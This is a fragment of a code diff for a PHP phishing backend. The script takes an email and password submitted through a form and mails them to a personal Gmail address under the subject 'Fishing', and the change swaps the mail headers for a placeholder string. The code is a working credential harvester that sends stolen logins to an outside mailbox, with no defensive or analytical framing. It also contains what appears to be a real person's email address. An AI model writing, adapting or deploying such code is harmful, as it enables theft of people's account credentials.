@@ -7,9 +7,7 @@ $pass = $POST['val1'];
 $to      = 'narekxachatryan1998@gmail.com';
 $subject = "Fishing";
 $message = "email: ".$mail.' | '."password: ".$pass;
-$headers = 'From: webmaster@example.com' . "\r\n" .
-    'Reply-To: webmaster@example.com' . "\r\n" .
-    'X-Mailer: PHP/' . phpversion();
+$headers = 'loloya';
 
 mail($to, $subject, $message, $headers);
 
